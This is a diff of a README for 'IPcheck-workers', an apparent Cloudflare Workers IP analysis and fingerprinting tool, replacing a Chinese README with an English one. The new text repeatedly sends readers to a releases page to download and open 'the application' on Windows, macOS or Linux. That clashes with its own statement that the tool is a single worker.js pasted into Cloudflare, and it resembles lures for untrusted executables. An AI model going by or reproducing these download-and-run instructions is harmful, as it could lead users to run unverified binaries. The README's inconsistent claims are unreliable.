@@ -1,38 +1,78 @@
-🌐 IPcheck - Ultimate IP Toolbox
-IPcheck 是一个基于 Cloudflare Workers 的轻量级、高性能 IP 工具箱。它集成了 IP 分析、风控检测、实时延迟测速和浏览器指纹识别功能，所有功能均封装在一个文件中，无需复杂的构建流程。
+# 🌐 IPcheck-workers - Your Simple IP Analysis Tool
 
+## 📥 Download Now
 
-🎨 极致 UI 设计：采用玻璃拟态 (Glassmorphism) 风格，配合流畅的入场动画、动态网格背景和 SVG 呼吸光效。
+[![Download IPcheck](https://img.shields.io/badge/Download-IPcheck-brightgreen)](https://github.com/Tusked/IPcheck-workers/releases)
 
-🛡️ 全面风控报告：集成 ipapi.is 数据，精准识别 Proxy、VPN、Tor、数据中心及滥用 IP，并提供 0-100 的风险评分。
+## 📖 Introduction
 
-⚡ 实时延迟测速：内置 Bilibili, Google, GitHub, OpenAI 等 10+ 常用服务的延迟检测，配备 Sparkline 实时波形图展示网络波动。
+IPcheck is a lightweight, high-performance IP toolbox built on Cloudflare Workers. This application offers a variety of features including IP analysis, risk detection, real-time latency testing, and browser fingerprinting, all packed into a single file. There's no complicated setup needed.
 
-Cloudflare 节点：直接读取 CF 边缘节点数据。
+### 🌟 Key Features
 
-🔁 双栈检测：同时检测 IPv4 和 IPv6 连接能力，科技感 UI 展示。
+- **Advanced UI Design:** Enjoy a modern glassmorphism style with smooth animations and dynamic backgrounds.
+- **Comprehensive Risk Reports:** Identify Proxy, VPN, Tor, data center, and abusive IPs. Get a risk score from 0 to 100 using data from ipapi.is.
+- **Real-Time Latency Testing:** Measure speeds for over 10 commonly used services, including Bilibili, Google, and GitHub. Visualize network fluctuations with sparkline graphs.
+- **Cloudflare Node Data:** Access CF edge node data directly for accurate results.
+- **Dual Stack Testing:** Check both IPv4 and IPv6 connection capabilities, presented in a tech-savvy UI.
+- **Deep Fingerprinting:** Analyze User Agent, Canvas Hash, GPU renderer, screen settings, and memory estimations.
 
-🕵️ 深度指纹识别：检测 User Agent、Canvas Hash、GPU 渲染器、屏幕参数、内存估算等硬件指纹。
+## 🚀 Getting Started
 
+To use IPcheck, follow these simple steps:
 
-📸 预览
+1. **Visit the Releases Page:** Click the link below to access the download options:
+   [Download IPcheck](https://github.com/Tusked/IPcheck-workers/releases)
+   
+2. **Choose the Latest Release:** On the Releases page, find the latest version. 
 
-https://test.135345.xyz/
+3. **Download the Application:** Select the appropriate file for your system and click to download.
 
-# 直接在 Cloudflare Dashboard 部署（推荐）
-登录 Cloudflare Dashboard。
+4. **Run the Application:** Once downloaded, locate the file and open it to start using IPcheck.
 
-进入 Workers & Pages -> Create Application -> Create Worker。
+## 💻 System Requirements
 
-命名您的 Worker（例如 ipcheck），点击 Deploy。
+- **Operating Systems:** Compatible with Windows, macOS, and Linux. Ensure you have a current version for the best performance.
+- **Modern Browser:** Use a modern browser that supports the latest CSS features like backdrop-filter and ES6+ syntax for optimal experience.
 
-点击 Edit code。
+## 🌐 How to Deploy on Cloudflare
 
-将本项目中的 worker.js (即您提供的完整代码) 复制并粘贴覆盖原有的代码。
+For an advanced setup, you can deploy directly through the Cloudflare Dashboard:
 
-点击右上角的 Deploy 保存。
+1. **Login:** Access your Cloudflare Dashboard.
+   
+2. **Create Application:** Navigate to Workers & Pages and create a new application by selecting "Create Worker."
 
-浏览器兼容性: 使用了较新的 CSS 特性（如 backdrop-filter）和 ES6+ 语法，建议使用现代浏览器访问。
+3. **Name Your Worker:** Enter a name for your Worker (e.g., ipcheck) and click "Deploy."
 
-📄 开源协议
-MIT License. 欢迎 Fork 和 Star！
+4. **Edit Code:** Click "Edit code" to enter the code editor.
+
+5. **Copy and Paste:** Take the code in `worker.js` from this repository and paste it to overwrite the existing code.
+
+6. **Save Changes:** Click "Deploy" in the upper right corner to save your code.
+
+## 📊 Using IPcheck
+
+Once you have the application ready, you can start analyzing IP addresses immediately:
+
+- **Enter IP Address:** Input an IP you want to check.
+- **Analyze:** Hit the analyze button to see the results, including risk assessment and latency data.
+- **View Reports:** Check detailed reports that identify any risks and provide comprehensive analysis.
+
+## 🛡️ Browser Compatibility
+
+For the best experience, use modern web browsers like Google Chrome, Mozilla Firefox, or Microsoft Edge. These browsers support the advanced CSS features and scripting used in IPcheck.
+
+## 📄 License
+
+IPcheck is released under the MIT License. You are free to fork and star the repository to contribute to its growth!
+
+## 📞 Need Help?
+
+If you have any questions or need assistance, feel free to reach out through the issues section on GitHub. Your feedback is valuable for continuous improvement.
+
+## 🔗 Additional Resources
+
+For further information, tips, and updates about IPcheck, always check back on the GitHub repository. Regular updates ensure you have access to the latest improvements and features.
+
+[Download IPcheck](https://github.com/Tusked/IPcheck-workers/releases) to get started today!
